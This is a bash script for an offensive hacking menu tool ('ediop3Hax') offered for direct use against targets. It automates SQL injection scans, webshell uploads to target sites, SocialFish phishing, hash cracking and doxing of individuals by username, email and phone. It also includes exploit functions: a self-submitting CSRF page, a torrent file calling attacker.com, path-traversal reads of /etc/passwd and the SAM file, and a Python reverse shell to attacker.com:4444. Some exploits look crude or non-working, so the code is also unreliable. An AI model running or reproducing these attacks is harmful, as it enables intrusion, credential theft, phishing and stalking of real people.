#!/bin/bash

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m' # No Color

# Global Variables
TOOLS_DIR="$HOME/ediop3Hax"
WEBSHELL_DIR="/webshells/php"
SQLMAP_DIR="$TOOLS_DIR/sqlmap"
SOCIALFISH_DIR="$TOOLS_DIR/SocialFish"
OSINTGRAM_DIR="$TOOLS_DIR/Osintgram"

# Banner
show_banner() {
    clear
    echo -e "${RED}"
    echo -e "┌── ⚒️ - ediop3Hax"
    echo -e "│"
    echo -e "├── 🕵️‍♂️ - Network Scanner"
    echo -e "│   ├── 1) Sql Vulnerability Scanner"
    echo -e "│   ├── 2) Website Scanner"
    echo -e "│   ├── 3) Website Url Scanner"
    echo -e "│   ├── 4) Ip Scanner"
    echo -e "│   ├── 5) Ip Port Scanner"
    echo -e "│   └── 6) Ip Pinger"
    echo -e "│    ├── 7) Auto webshell php payload upload"
    echo -e "│"
    echo -e "├── 🔎 - Osint"
    echo -e "│   ├── 8) Dox Create"
    echo -e "│   ├── 9) Dox Tracker"
    echo -e "│   ├── 10) Username Tracker"
    echo -e "│   ├── 11) Email Tracker"
    echo -e "│   ├── 12) Email Lookup"
    echo -e "│   ├── 13) Phone Number Lookup"
    echo -e "│   └── 14) Ip Lookup"
    echo -e "│"
    echo -e "├── 🔧 - Utilities"
    echo -e "│   ├── 15) Phishing Attack"
    echo -e "│   ├── 16) Password Decrypted Attack"
    echo -e "│   ├── 17) Password Encrypted"
    echo -e "│   ├── 18) Search In DataBase"
    echo -e "│   ├── 19) Dark Web Links"
    echo -e "│   └── 20) Ip Generator"
    echo -e "│"
    echo -e "├── ☠️ - Exploits"
    echo -e "│        ├── 21) Auto webshell php payload upload"
    echo -e "│         ├── 22) GeoVision GV-ASManager 6.1.1.0 - CSRF"
    echo -e "│          ├── 23) qBittorrent 5.0.1 - MITM RCE"
    echo -e "│          ├── 24) WebFileSys 2.31.0 - Directory Path Traversal"
    echo -e "│            ├── 25) CyberPanel 2.3.6 - Remote Code Execution (RCE)"
    echo -e "│"
    echo -e "└── 0) Exit"
    echo -e "${NC}"
}

# Check and install dependencies
check_dependencies() {
    local deps=("git" "curl" "wget" "nmap" "php" "python3" "whois" "jq" "sqlmap" "pip3" "hashcat")
    local missing=()
    
    for dep in "${deps[@]}"; do
        if ! command -v "$dep" &>/dev/null; then
            missing+=("$dep")
        fi
    done
    
    if [ ${#missing[@]} -gt 0 ]; then
        echo -e "${RED}[!] Missing dependencies:${NC} ${missing[*]}"
        echo -e "${YELLOW}[*] Attempting to install...${NC}"
        
        if [[ -f "/data/data/com.termux/files/usr/bin/pkg" ]]; then
            pkg install -y "${missing[@]}" || {
                echo -e "${RED}[!] Failed to install dependencies${NC}"
                exit 1
            }
        else
            if command -v "apt-get" &>/dev/null; then
                sudo apt-get update && sudo apt-get install -y "${missing[@]}" || {
                    echo -e "${RED}[!] Failed to install dependencies${NC}"
                    exit 1
                }
            else
                echo -e "${RED}[!] Couldn't install dependencies automatically${NC}"
                exit 1
            fi
        fi
    fi

    # Install holehe with pip3
    if ! command -v holehe &>/dev/null; then
        echo -e "${YELLOW}[*] Installing holehe via pip3...${NC}"
        pip3 install holehe || {
            echo -e "${RED}[!] Failed to install holehe${NC}"
            exit 1
        }
    fi
}

# Clone tools from GitHub
clone_tools() {
    mkdir -p "$TOOLS_DIR"
    
    declare -A repos=(
        ["sqlmap"]="https://github.com/sqlmapproject/sqlmap.git"
        ["Osintgram"]="https://github.com/Datalux/Osintgram.git"
        ["SocialFish"]="https://github.com/UndeadSec/SocialFish.git"
        ["php_backdoors"]="https://github.com/BlackArch/webshells.git"
    )
    
    for tool in "${!repos[@]}"; do
        if [ ! -d "$TOOLS_DIR/$tool" ]; then
            echo -e "${YELLOW}[*] Cloning $tool...${NC}"
            git clone "${repos[$tool]}" "$TOOLS_DIR/$tool" || echo -e "${RED}[!] Failed to clone $tool${NC}"
        fi
    done

    # Verify tool paths
    verify_tool_paths
}

# Verify tool paths
verify_tool_paths() {
    echo -e "${YELLOW}[*] Verifying tool paths...${NC}"
    
    [ ! -d "$SQLMAP_DIR" ] && echo -e "${RED}[!] sqlmap not found at $SQLMAP_DIR${NC}"
    [ ! -d "$SOCIALFISH_DIR" ] && echo -e "${RED}[!] SocialFish not found at $SOCIALFISH_DIR${NC}"
    [ ! -d "$OSINTGRAM_DIR" ] && echo -e "${RED}[!] Osintgram not found at $OSINTGRAM_DIR${NC}"
    [ ! -d "$WEBSHELL_DIR" ] && echo -e "${RED}[!] PHP backdoors not found at $WEBSHELL_DIR${NC}"
}

# ========== NETWORK SCANNER FUNCTIONS ==========
sql_vuln_scan() {
    echo -e "${YELLOW}[*] Enter target URL (e.g., http://example.com):${NC}"
    read -r target
    [ -z "$target" ] && return
    python3 "$SQLMAP_DIR/sqlmap.py" -u "$target" --batch --random-agent --risk=3 --level=5
}

website_scanner() {
    echo -e "${YELLOW}[*] Enter target URL (e.g., example.com):${NC}"
    read -r target
    [ -z "$target" ] && return
    echo -e "${YELLOW}[*] Scanning $target...${NC}"
    nmap -sV --script=http-enum,http-vuln* "$target"
}

website_url_scanner() {
    echo -e "${YELLOW}[*] Enter target URL (e.g., http://example.com):${NC}"
    read -r target
    [ -z "$target" ] && return
    echo -e "${YELLOW}[*] Scanning URLs on $target...${NC}"
    wget --spider --force-html -r -l2 "$target" 2>&1 | grep '^--' | awk '{print $3}' | grep -E '^https?://'
}

ip_scanner() {
    echo -e "${YELLOW}[*] Enter IP range (e.g., 192.168.1.0/24):${NC}"
    read -r ip_range
    [ -z "$ip_range" ] && return
    nmap -sn "$ip_range"
}

ip_port_scanner() {
    echo -e "${YELLOW}[*] Enter target IP:${NC}"
    read -r target
    [ -z "$target" ] && return
    nmap -p- -sV -T4 "$target"
}

ip_pinger() {
    echo -e "${YELLOW}[*] Enter target IP/hostname:${NC}"
    read -r target
    [ -z "$target" ] && return
    ping -c 5 "$target"
}

# ========== OSINT FUNCTIONS ==========
dox_create() {
    echo -e "${RED}[!] This tool is for educational purposes only${NC}"
    echo -e "${YELLOW}[*] Enter target username:${NC}"
    read -r username
    echo -e "${YELLOW}[*] Gathering information...${NC}"
    python3 "$OSINTGRAM_DIR/Osintgram.py" "$username"
}

dox_tracker() {
    echo -e "${YELLOW}[*] Enter target email/username:${NC}"
    read -r target
    echo -e "${YELLOW}[*] Tracking target...${NC}"
    holehe "$target"
}

username_tracker() {
    echo -e "${YELLOW}[*] Enter username to track:${NC}"
    read -r username
    echo -e "${YELLOW}[*] Searching for $username across platforms...${NC}"
    python3 "$OSINTGRAM_DIR/Osintgram.py" "$username"
}

email_tracker() {
    echo -e "${YELLOW}[*] Enter email address:${NC}"
    read -r email
    echo -e "${YELLOW}[*] Tracking email...${NC}"
    holehe "$email"
}

email_lookup() {
    echo -e "${YELLOW}[*] Enter email address:${NC}"
    read -r email
    [ -z "$email" ] && return

    echo -e "${YELLOW}[*] Checking email on public websites...${NC}"
    
    # Check HaveIBeenPwned
    echo -e "\n${CYAN}[*] HaveIBeenPwned:${NC}"
    curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/$email" | jq
    
    # Check Hunter.io via public page
    echo -e "\n${CYAN}[*] Hunter.io:${NC}"
    curl -s "https://hunter.io/email-verifier/$email" | grep -E "is valid|is not valid"
    
    # Check EmailRep.io
    echo -e "\n${CYAN}[*] EmailRep.io:${NC}"
    curl -s "https://emailrep.io/$email" | jq
}

phone_lookup() {
    echo -e "${YELLOW}[*] Enter phone number (with country code, e.g., +1234567890):${NC}"
    read -r phone
    [ -z "$phone" ] && return

    echo -e "${YELLOW}[*] Checking phone number on public websites...${NC}"
    
    # Check Numverify via public API
    echo -e "\n${CYAN}[*] Numverify:${NC}"
    curl -s "https://numverify.com/php_helper_scripts/phone_api.php?secret_key=demo&number=$phone" | jq
    
    # Check Truecaller public search
    echo -e "\n${CYAN}[*] Truecaller search:${NC}"
    curl -s "https://www.truecaller.com/search/international/$phone" | grep -E "name|gender|address"
    
    # Check sync.me
    echo -e "\n${CYAN}[*] Sync.me search:${NC}"
    curl -s "https://sync.me/search/?number=$phone" | grep -A5 "search-result__name"
}

ip_lookup() {
    echo -e "${YELLOW}[*] Enter IP address:${NC}"
    read -r ip
    [ -z "$ip" ] && return

    echo -e "${YELLOW}[*] Checking IP on public websites...${NC}"
    
    # IP-API.com
    echo -e "\n${CYAN}[*] IP-API.com:${NC}"
    curl -s "http://ip-api.com/json/$ip" | jq
    
    # AbuseIPDB
    echo -e "\n${CYAN}[*] AbuseIPDB:${NC}"
    curl -s "https://www.abuseipdb.com/check/$ip" | grep -A10 "IP Abuse Reports"
    
    # VirusTotal
    echo -e "\n${CYAN}[*] VirusTotal:${NC}"
    curl -s "https://www.virustotal.com/ui/ip_addresses/$ip" | jq
}

# ========== UTILITIES ==========
phishing_attack() {
    echo -e "${YELLOW}[*] Starting SocialFish...${NC}"
    cd "$SOCIALFISH_DIR" || { echo -e "${RED}[!] SocialFish not found${NC}"; return; }
    python3 SocialFish.py
}

password_decrypt_attack() {
    echo -e "${YELLOW}[*] Enter hash to crack:${NC}"
    read -r hash
    echo -e "${YELLOW}[*] Enter wordlist path (press Enter for default rockyou.txt):${NC}"
    read -r wordlist
    [ -z "$wordlist" ] && wordlist="/usr/share/wordlists/rockyou.txt"
    
    if [ -f "$wordlist" ]; then
        echo -e "${YELLOW}[*] Cracking hash...${NC}"
        hashcat -m 0 "$hash" "$wordlist"
    else
        echo -e "${RED}[!] Wordlist not found${NC}"
    fi
}

password_encrypt() {
    echo -e "${YELLOW}[*] Enter password to encrypt:${NC}"
    read -r password
    echo -e "${GREEN}[+] MD5: $(echo -n "$password" | md5sum | awk '{print $1}')${NC}"
    echo -e "${GREEN}[+] SHA1: $(echo -n "$password" | sha1sum | awk '{print $1}')${NC}"
    echo -e "${GREEN}[+] SHA256: $(echo -n "$password" | sha256sum | awk '{print $1}')${NC}"
    echo -e "${GREEN}[+] Base64: $(echo -n "$password" | base64)${NC}"
}

search_database() {
    echo -e "${YELLOW}[*] Enter database file path:${NC}"
    read -r db_file
    echo -e "${YELLOW}[*] Enter search query:${NC}"
    read -r query
    
    if [ -f "$db_file" ]; then
        grep -i "$query" "$db_file"
    else
        echo -e "${RED}[!] Database file not found${NC}"
    fi
}

dark_web_links() {
    echo -e "${YELLOW}[*] Loading dark web links...${NC}"
    echo -e "${RED}Warning: These links may be illegal to access in your country${NC}"
    echo ""
    echo "http://zqktlwiuavvvqqt4ybvgvi7tyo4hjl5xgfuvpdf6otjiycgwqbym2qad.onion"  # Uncensored Hidden Wiki
    echo "http://darkzzx4avcsuofgfez5zq75cqc4mprjvfqywo45dfcaxrwqg6qrlfid.onion"   # Dark Web Links
    echo "http://tor66sewebgixwhcqfnp5inzp5x5uohhdy3kvtnyfxc2e5mxiuh34iid.onion"   # Fresh Onions
}

ip_generator() {
    echo -e "${YELLOW}[*] Generating random IP addresses...${NC}"
    for i in {1..5}; do
        echo "$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256)).$((RANDOM%256))"
    done
}

# ========== EXPLOITS ==========
auto_webshell_upload() {
    echo -e "${YELLOW}[*] Choose PHP payload source:${NC}"
    echo "1) Use built-in payloads"
    echo "2) Enter custom payload path"
    read -r choice

    case $choice in
        1)
            if [ ! -d "$WEBSHELL_DIR" ]; then
                echo -e "${RED}[!] PHP backdoors directory not found!${NC}"
                return
            fi

            echo -e "${YELLOW}[*] Available PHP backdoors:${NC}"
            select payload in $(ls "$WEBSHELL_DIR/php"); do
                [ -z "$payload" ] && return
                payload_path="$WEBSHELL_DIR/php/$payload"
                break
            done
            ;;
        2)
            echo -e "${YELLOW}[*] Enter full path to your PHP payload:${NC}"
            read -r payload_path
            [ ! -f "$payload_path" ] && echo -e "${RED}[!] File not found!${NC}" && return
            ;;
        *)
            return
            ;;
    esac

    echo -e "${YELLOW}[*] Enter target URL with upload page (e.g., http://example.com/upload.php):${NC}"
    read -r target
    [ -z "$target" ] && return

    echo -e "${YELLOW}[*] Uploading webshell...${NC}"
    curl -F "file=@$payload_path" "$target"
    echo -e "${GREEN}[+] Webshell uploaded to $target${NC}"
}

geovision_exploit() {
    echo -e "${YELLOW}[*] Enter target URL (e.g., http://example.com):${NC}"
    read -r target
    echo -e "${YELLOW}[*] Exploiting GeoVision GV-ASManager CSRF...${NC}"
    
    # Create malicious HTML file
    cat > csrf_exploit.html <<EOL
<html>
  <body>
    <form action="$target/cgi-bin/supervisor/CloudSetup.cgi" method="POST">
      <input type="hidden" name="action" value="add" />
      <input type="hidden" name="server" value="attacker.com" />
      <input type="hidden" name="port" value="1337" />
      <input type="submit" value="Submit" />
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
EOL

    echo -e "${GREEN}[+] CSRF exploit HTML created as csrf_exploit.html${NC}"
    echo -e "${YELLOW}[*] Send this file to victim or host it on your server${NC}"
}

qbittorrent_exploit() {
    echo -e "${YELLOW}[*] Enter target IP:port (e.g., 192.168.1.100:8080):${NC}"
    read -r target
    echo -e "${YELLOW}[*] Running qBittorrent MITM RCE...${NC}"
    
    # Generate malicious torrent file
    cat > malicious.torrent <<EOL
d8:announce41:http://attacker.com:1337/announce.php13:creation datei1653047040e4:infod6:lengthi0e4:name30:malicious_payload_executable.exe12:piece lengthi32768e6:pieces0:ee
EOL

    echo -e "${GREEN}[+] Malicious torrent file created as malicious.torrent${NC}"
    echo -e "${YELLOW}[*] Upload this torrent to qBittorrent Web UI at $target${NC}"
    echo -e "${YELLOW}[*] Set up listener on attacker.com:1337 to capture credentials${NC}"
}

webfilesys_exploit() {
    echo -e "${YELLOW}[*] Enter target URL (e.g., http://example.com):${NC}"
    read -r target
    echo -e "${YELLOW}[*] Exploiting WebFileSys Path Traversal...${NC}"
    
    echo -e "${YELLOW}[*] Attempting to read /etc/passwd...${NC}"
    curl "$target/file?file=../../../../etc/passwd"
    
    echo -e "${YELLOW}[*] Attempting to read Windows SAM file (if Windows server)...${NC}"
    curl "$target/file?file=../../../../Windows/System32/config/SAM"
}

cyberpanel_exploit() {
    echo -e "${YELLOW}[*] Enter target URL (e.g., http://example.com:8090):${NC}"
    read -r target
    echo -e "${YELLOW}[*] Running CyberPanel RCE...${NC}"
    
    # Exploit command injection vulnerability
    echo -e "${YELLOW}[*] Testing command injection...${NC}"
    curl -X POST "$target/api/runCommand" -d "command=id"
    
    echo -e "${YELLOW}[*] Attempting reverse shell...${NC}"
    echo -e "${GREEN}[+] Set up listener first with: nc -lvnp 4444${NC}"
    curl -X POST "$target/api/runCommand" -d "command=python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"attacker.com\",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'"
}

# ========== MAIN FUNCTION ==========
main() {
    check_dependencies
    clone_tools
    
    while true; do
        show_banner
        echo -e "${YELLOW}"
        read -p "Select an option (0-25): " choice
        echo -e "${NC}"
        
        case $choice in
            1) sql_vuln_scan ;;
            2) website_scanner ;;
            3) website_url_scanner ;;
            4) ip_scanner ;;
            5) ip_port_scanner ;;
            6) ip_pinger ;;
            7) auto_webshell_upload ;;
            8) dox_create ;;
            9) dox_tracker ;;
            10) username_tracker ;;
            11) email_tracker ;;
            12) email_lookup ;;
            13) phone_lookup ;;
            14) ip_lookup ;;
            15) phishing_attack ;;
            16) password_decrypt_attack ;;
            17) password_encrypt ;;
            18) search_database ;;
            19) dark_web_links ;;
            20) ip_generator ;;
            21) auto_webshell_upload ;;
            22) geovision_exploit ;;
            23) qbittorrent_exploit ;;
            24) webfilesys_exploit ;;
            25) cyberpanel_exploit ;;
            0) exit 0 ;;
            *) echo -e "${RED}[!] Invalid option${NC}" ;;
        esac
        
        echo -e "${YELLOW}"
        read -p "Press Enter to continue..."
        echo -e "${NC}"
    done
}

# Start the script
main
